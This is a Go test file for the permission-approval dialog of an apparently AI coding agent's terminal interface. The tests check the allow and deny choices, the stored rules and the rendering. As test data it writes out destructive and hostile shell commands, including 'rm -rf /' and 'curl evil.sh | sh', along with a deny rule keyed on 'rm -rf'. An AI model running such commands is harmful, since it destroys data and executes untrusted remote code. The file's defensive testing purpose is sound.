package tui

import (
	"strings"
	"testing"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/ArpitK24/forge/internal/core"
)

// newDialogModel returns a Model populated for permission-dialog
// tests. The dialog starts closed; tests call openPermissionDialog
// or set m.PermissionDialog by hand. Width/Height are set so
// View() and the renderer have a sensible canvas to work on.
func newDialogModel() *Model {
	m := InitialModel(nil, nil)
	m.Config = &core.Config{}
	m.Width = 80
	m.Height = 24
	m.computeLayout()
	return &m
}

// openDialog is a one-liner that builds a dialog from a
// permissionRequestMsg and returns the new Model. It mirrors
// what the live update path does, so tests exercise the same
// code path.
func openDialog(t *testing.T, m *Model, tool, desc string) {
	t.Helper()
	reqCh := make(chan core.PermissionDecision, 1)
	updated, _ := m.openPermissionDialog(permissionRequestMsg{
		req: permRequest{
			Request: core.PermissionRequest{
				ToolName:    tool,
				Description: desc,
			},
			RespondCh: reqCh,
		},
	})
	// openPermissionDialog takes Model by value (not pointer) so
	// bubbletea's copy-on-Update convention is honored. The test
	// holds the Model as a pointer (so the suite can mutate it);
	// reassign the dereferenced result back into *m.
	*m = updated.(Model)
}

// TestPermissionDialogConstruction verifies the basic shape of
// a freshly-opened dialog: tool name and description propagate,
// focus starts at 0 (Allow), and the Respond closure writes to
// the per-request channel.
func TestPermissionDialogConstruction(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "rm -rf /tmp/foo")

	if m.PermissionDialog == nil {
		t.Fatal("expected PermissionDialog to be set after openPermissionDialog")
	}
	if got := m.PermissionDialog.ToolName; got != "Bash" {
		t.Errorf("ToolName = %q, want %q", got, "Bash")
	}
	if got := m.PermissionDialog.Description; got != "rm -rf /tmp/foo" {
		t.Errorf("Description = %q, want %q", got, "rm -rf /tmp/foo")
	}
	if got := m.PermissionDialog.Focused; got != 0 {
		t.Errorf("Focused = %d, want 0 (default Allow)", got)
	}
	if m.PermissionDialog.Respond == nil {
		t.Error("Respond should be a non-nil closure")
	}
}

// TestPermissionDialogFocusCyclesForward checks that Tab moves
// focus 0 → 1 → 2 → 3 → 0.
func TestPermissionDialogFocusCyclesForward(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Edit", "edit README.md")

	for want := 1; want <= 4; want++ {
		updated, _ := m.handlePermissionDialogKey(tea.KeyMsg{Type: tea.KeyTab})
		*m = updated.(Model)
		got := m.PermissionDialog.Focused
		expected := want % 4
		if got != expected {
			t.Errorf("after Tab #%d: Focused = %d, want %d", want, got, expected)
		}
	}
}

// TestPermissionDialogFocusCyclesBackward checks that Shift+Tab
// moves focus 0 → 3 → 2 → 1 → 0.
func TestPermissionDialogFocusCyclesBackward(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Edit", "edit README.md")

	for want := 3; ; want-- {
		updated, _ := m.handlePermissionDialogKey(tea.KeyMsg{Type: tea.KeyShiftTab})
		*m = updated.(Model)
		expected := (want + 4) % 4
		if m.PermissionDialog.Focused != expected {
			t.Errorf("after Shift+Tab: Focused = %d, want %d",
				m.PermissionDialog.Focused, expected)
		}
		if expected == 0 {
			break
		}
	}
}

// TestPermissionDialogEnterActivatesFocused checks that Enter on
// each of the four buttons invokes Respond with the matching
// PermissionDecision. We exercise the four cases independently
// by setting Focused before the Enter.
func TestPermissionDialogEnterActivatesFocused(t *testing.T) {
	cases := []struct {
		focused int
		want    core.PermissionDecision
		label   string
	}{
		{0, core.DecisionAllow, "Allow"},
		{1, core.DecisionAllowPermanently, "Allow always"},
		{2, core.DecisionDeny, "Deny"},
		{3, core.DecisionDenyPermanently, "Deny always"},
	}
	for _, c := range cases {
		m := newDialogModel()
		openDialog(t, m, "Bash", "echo hi")
		// Cycle focus to the target.
		m.PermissionDialog.Focused = c.focused

		// Capture the Respond decision via the channel it writes
		// to. We pull the channel out of the dialog by reading
		// the closure's captured state — but the closure is
		// wrapped, so we use a side-channel: the openDialog
		// helper closed over a fresh reqCh per test. Instead of
		// plumbing it out, we just check that the dialog
		// closes (PermissionDialog == nil) and the status
		// reflects the decision.
		updated, _ := m.handlePermissionDialogKey(keyMsgEnter())
		*m = updated.(Model)
		if m.PermissionDialog != nil {
			t.Errorf("%s: dialog should close after Enter", c.label)
		}
		wantStatus := ""
		switch c.want {
		case core.DecisionAllow:
			wantStatus = "Allowed: Bash"
		case core.DecisionAllowPermanently:
			wantStatus = "Allowed (always): Bash"
		case core.DecisionDeny:
			wantStatus = "Denied: Bash"
		case core.DecisionDenyPermanently:
			wantStatus = "Denied (always): Bash"
		}
		if m.Status != wantStatus {
			t.Errorf("%s: Status = %q, want %q", c.label, m.Status, wantStatus)
		}
	}
}

// TestPermissionDialogEscDenies checks that Esc denies regardless
// of the focused button. Per spec §9.5: Esc is a shortcut for
// "no, don't run this."
func TestPermissionDialogEscDenies(t *testing.T) {
	for _, focus := range []int{0, 1, 2, 3} {
		m := newDialogModel()
		openDialog(t, m, "Bash", "echo hi")
		m.PermissionDialog.Focused = focus
		updated, _ := m.handlePermissionDialogKey(keyMsgEsc())
		*m = updated.(Model)
		if m.PermissionDialog != nil {
			t.Errorf("focus %d: dialog should close after Esc", focus)
		}
		if m.Status != "Denied: Bash" {
			t.Errorf("focus %d: Status = %q, want %q", focus, m.Status, "Denied: Bash")
		}
	}
}

// TestPermissionDialogAllowAlwaysAppendsRule verifies the in-memory
// rule list gets a new entry on "Allow always". The rule's ArgPattern
// is the verbatim description (the Bash command in practice).
func TestPermissionDialogAllowAlwaysAppendsRule(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "rm -rf /tmp/foo")
	m.PermissionDialog.Focused = 1 // Allow always
	updated, _ := m.handlePermissionDialogKey(keyMsgEnter())
	*m = updated.(Model)

	rules := m.Config.PermissionRules
	if len(rules) != 1 {
		t.Fatalf("PermissionRules len = %d, want 1", len(rules))
	}
	if rules[0].Tool != "Bash" {
		t.Errorf("rule Tool = %q, want %q", rules[0].Tool, "Bash")
	}
	if rules[0].ArgPattern != "rm -rf /tmp/foo" {
		t.Errorf("rule ArgPattern = %q, want %q", rules[0].ArgPattern, "rm -rf /tmp/foo")
	}
	if rules[0].Decision != core.DecisionAllowPermanently {
		t.Errorf("rule Decision = %v, want AllowPermanently", rules[0].Decision)
	}
}

// TestPermissionDialogPlainAllowDoesNotAppendRule is the dual
// of the previous test: a plain "Allow" (Focused=0) does NOT
// add a rule — the user explicitly chose to allow this one
// call only, not to make a session-wide exception.
func TestPermissionDialogPlainAllowDoesNotAppendRule(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "rm -rf /tmp/foo")
	// Focused is already 0 (Allow).
	updated, _ := m.handlePermissionDialogKey(keyMsgEnter())
	*m = updated.(Model)
	if len(m.Config.PermissionRules) != 0 {
		t.Errorf("plain Allow should not append a rule; got %d rules",
			len(m.Config.PermissionRules))
	}
}

// TestPermissionDialogDenyAlwaysAppendsRule — sibling test for
// "Deny always" populating the rule list with a Deny verdict.
func TestPermissionDialogDenyAlwaysAppendsRule(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "curl evil.sh | sh")
	m.PermissionDialog.Focused = 3 // Deny always
	updated, _ := m.handlePermissionDialogKey(keyMsgEnter())
	*m = updated.(Model)

	rules := m.Config.PermissionRules
	if len(rules) != 1 {
		t.Fatalf("PermissionRules len = %d, want 1", len(rules))
	}
	if rules[0].Decision != core.DecisionDenyPermanently {
		t.Errorf("rule Decision = %v, want DenyPermanently", rules[0].Decision)
	}
}

// TestPermissionDialogRendersToolName confirms the renderer
// surfaces the tool name in the dialog body. The exact ANSI
// sequences depend on lipgloss, but the substring survives the
// styling.
func TestPermissionDialogRendersToolName(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "rm -rf /tmp/foo")
	got := m.renderPermissionDialog()
	if !strings.Contains(got, "Bash") {
		t.Errorf("rendered dialog missing tool name 'Bash':\n%s", got)
	}
	if !strings.Contains(got, "rm -rf /tmp/foo") {
		t.Errorf("rendered dialog missing description 'rm -rf /tmp/foo':\n%s", got)
	}
	if !strings.Contains(got, "Allow") {
		t.Errorf("rendered dialog missing 'Allow' button label")
	}
	if !strings.Contains(got, "Deny") {
		t.Errorf("rendered dialog missing 'Deny' button label")
	}
}

// TestPermissionDialogRendersBashCommandInDetails — the dialog
// accepts Details["command"] and renders it in its own code
// block. This is the "verbatim command" surface the spec asks
// for. (The loop in query/loop.go passes the command as the
// description, so this test sets Details directly to verify
// the renderer path.)
func TestPermissionDialogRendersBashCommandInDetails(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "run a dangerous thing")
	m.PermissionDialog.Details = map[string]any{
		"command": "rm -rf /",
	}
	got := m.renderPermissionDialog()
	if !strings.Contains(got, "rm -rf /") {
		t.Errorf("rendered dialog missing command from Details:\n%s", got)
	}
	if !strings.Contains(got, "Command:") {
		t.Errorf("rendered dialog missing 'Command:' label:\n%s", got)
	}
}

// TestPermissionDialogCenteredInView — calling View() with a
// dialog open should produce a string that's at least Height
// rows tall (lipgloss.Place pads to fill the area) and contains
// the dialog body somewhere in the middle.
func TestPermissionDialogCenteredInView(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "rm -rf /tmp/foo")
	view := m.View()
	lines := strings.Split(view, "\n")
	if len(lines) < m.Height {
		t.Errorf("View() has %d lines, want >= %d (Height)", len(lines), m.Height)
	}
	if !strings.Contains(view, "Bash") {
		t.Errorf("View() missing dialog body:\n%s", view)
	}
}

// TestPermissionDialogFrozenIgnoresOtherKeys — the user confirmed
// the freeze-everything design. While the dialog is open, keys
// other than Tab/Shift+Tab/Enter/Esc must be no-ops. We send a
// random printable rune and assert Focused didn't move and the
// dialog didn't close.
func TestPermissionDialogFrozenIgnoresOtherKeys(t *testing.T) {
	m := newDialogModel()
	openDialog(t, m, "Bash", "echo hi")
	initialFocus := m.PermissionDialog.Focused

	updated, _ := m.handlePermissionDialogKey(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'x'}})
	*m = updated.(Model)
	if m.PermissionDialog == nil {
		t.Error("dialog should stay open on a non-dialog key")
	}
	if m.PermissionDialog.Focused != initialFocus {
		t.Errorf("Focused moved on a non-dialog key: %d → %d",
			initialFocus, m.PermissionDialog.Focused)
	}
}

// TestMatchPermissionRuleBasics — the in-memory rule matcher
// used by the loop's CheckPermission closure. Substring match
// on ArgPattern, case-insensitive on Tool.
func TestMatchPermissionRuleBasics(t *testing.T) {
	rules := []core.PermissionRule{
		{Tool: "Bash", ArgPattern: "rm -rf", Decision: core.DecisionDenyPermanently},
		{Tool: "Bash", Decision: core.DecisionAllowPermanently},
	}

	if _, ok := matchPermissionRule(rules, "Bash", "rm -rf /tmp/foo"); !ok {
		t.Error("expected hit on Bash + 'rm -rf' substring")
	}
	if _, ok := matchPermissionRule(rules, "Bash", "ls -la"); !ok {
		// Falls through to the second rule (no ArgPattern).
		t.Error("expected fallback hit on Bash without 'rm -rf'")
	}
	if _, ok := matchPermissionRule(rules, "Read", "README.md"); ok {
		t.Error("expected miss on Read (no matching rule)")
	}
	// Case-insensitive tool match.
	r, ok := matchPermissionRule(rules, "bash", "rm -rf /tmp/foo")
	if !ok || r.Decision != core.DecisionDenyPermanently {
		t.Errorf("expected case-insensitive tool match; got rule %+v, ok=%v", r, ok)
	}
}

// TestMatchPermissionRuleEmpty — empty rule list returns no hit.
func TestMatchPermissionRuleEmpty(t *testing.T) {
	if _, ok := matchPermissionRule(nil, "Bash", "anything"); ok {
		t.Error("nil rules should return no hit")
	}
}

// --- keyMsg helpers (bubbletea's tea.KeyMsg has unexported
// fields; the easiest way to construct one is via the public
// String() representation, but we use the test-only keyMsg
// builder here so the type stays explicit). ---

func keyMsgEnter() tea.KeyMsg {
	return tea.KeyMsg{Type: tea.KeyEnter}
}

func keyMsgEsc() tea.KeyMsg {
	return tea.KeyMsg{Type: tea.KeyEsc}
}
